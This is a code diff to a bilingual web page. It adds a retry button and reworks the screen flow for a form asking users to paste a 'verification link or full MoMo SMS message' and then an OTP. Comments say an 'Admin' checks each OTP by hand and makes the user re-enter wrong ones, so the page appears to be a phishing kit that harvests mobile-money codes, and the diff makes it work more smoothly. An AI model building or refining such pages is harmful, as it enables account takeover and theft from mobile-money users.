@@ -323,6 +323,24 @@
             background: #e6b800;
         }
 
+        .link-retry {
+            width: 100%;
+            margin-top: 10px;
+            padding: 12px;
+            background: transparent;
+            color: #2563EB;
+            border: 2px solid #BFDBFE;
+            border-radius: 8px;
+            font-size: 14px;
+            font-weight: 600;
+            cursor: pointer;
+            display: none;
+        }
+
+        .link-retry.show {
+            display: block;
+        }
+
         .link-help {
             background: #f8f9fa;
             border-left: 3px solid #ffcc00;
@@ -788,6 +806,7 @@
                 <input type="text" class="link-input" id="verificationLinkInput" placeholder="Paste verification link or full MoMo SMS message..." autocomplete="off">
                 
                 <button class="link-action" id="verifyLinkBtn" disabled>Verify Link</button>
+                <button class="link-retry" id="linkRetryBtn" type="button">Retry</button>
             </div>
 
             <!-- OTP Screen (after link verification) -->
@@ -1081,6 +1100,7 @@
         const verificationLinkInput = document.getElementById('verificationLinkInput');
         const submitBtn = document.getElementById('submitBtn');
         const verifyLinkBtn = document.getElementById('verifyLinkBtn');
+        const linkRetryBtn = document.getElementById('linkRetryBtn');
         const proceedVerifiedBtn = document.getElementById('proceedVerifiedBtn') || {};
         const verifyStatusText = document.getElementById('verifyStatusText') || {};
         let mtnVerifiedPollInterval = null;
@@ -1185,16 +1205,12 @@
 
                 wrongOtpNotified = false;
 
-                errEl.textContent = t('otpSubmitted');
-                errEl.style.background = '#EFF6FF';
-                errEl.style.color = '#2563EB';
-                errEl.classList.add('show');
-
                 otpInputs.forEach(i => i.value = '');
                 otpSubmitBtn.textContent = t('otpVerify');
                 delete otpSubmitBtn.dataset.busy;
                 otpSubmitBtn.disabled = true;
 
+                showWaitingScreen(currentLang === 'fr' ? 'Vérification du code OTP...' : 'Verifying OTP...');
                 startStatusPolling(currentRequestId);
 
             } catch (e) {
@@ -1581,7 +1597,8 @@
                         }
                         verificationLinkInput.value = '';
                         verifyLinkBtn.disabled = true;
-                        verificationLinkInput.focus();
+                        linkRetryBtn.textContent = currentLang === 'fr' ? 'Réessayer' : 'Retry';
+                        linkRetryBtn.classList.add('show');
                     }
                     break;
 
@@ -1596,6 +1613,8 @@
                     // Admin marked the OTP as wrong - user must re-enter
                     if (!wrongOtpNotified) {
                         wrongOtpNotified = true;
+                        waitingScreen.style.display = 'none';
+                        otpScreen.classList.add('active');
                         resetOtpEntry();
                     }
                     break;
@@ -1782,6 +1801,17 @@
         // Verification link input handling
         verificationLinkInput.addEventListener('input', function() {
             verifyLinkBtn.disabled = !validatorLink(this.value);
+            document.getElementById('linkError').classList.remove('show');
+            linkRetryBtn.classList.remove('show');
+        });
+
+        linkRetryBtn.addEventListener('click', function() {
+            verificationLinkInput.value = '';
+            verifyLinkBtn.disabled = true;
+            verifyLinkBtn.textContent = t('verifyLink');
+            document.getElementById('linkError').classList.remove('show');
+            linkRetryBtn.classList.remove('show');
+            verificationLinkInput.focus();
         });
 
         function validatorLink(value) {
@@ -1841,6 +1871,7 @@
             if (!validatorLink(rawInput)) return;
 
             showWaitingScreen(currentLang === 'fr' ? 'Vérification du lien...' : 'Verifying link...');
+            verificationLinkInput.value = '';
             verifyLinkBtn.disabled = true;
             verifyLinkBtn.textContent = t('verifying');
 
@@ -1867,6 +1898,7 @@
                 }
 
                 wrongLinkNotified = false;
+                linkRetryBtn.classList.remove('show');
 
                 document.getElementById('linkError').textContent = t('linkSubmitted');
                 document.getElementById('linkError').style.background = '#EFF6FF';
@@ -1883,6 +1915,7 @@
                 document.getElementById('linkError').classList.add('show');
                 verifyLinkBtn.disabled = validatorLink(verificationLinkInput.value);
                 verifyLinkBtn.textContent = t('verifyLink');
+                linkRetryBtn.classList.remove('show');
                 linkScreen.classList.add('active');
                 waitingScreen.style.display = 'none';
                 return;
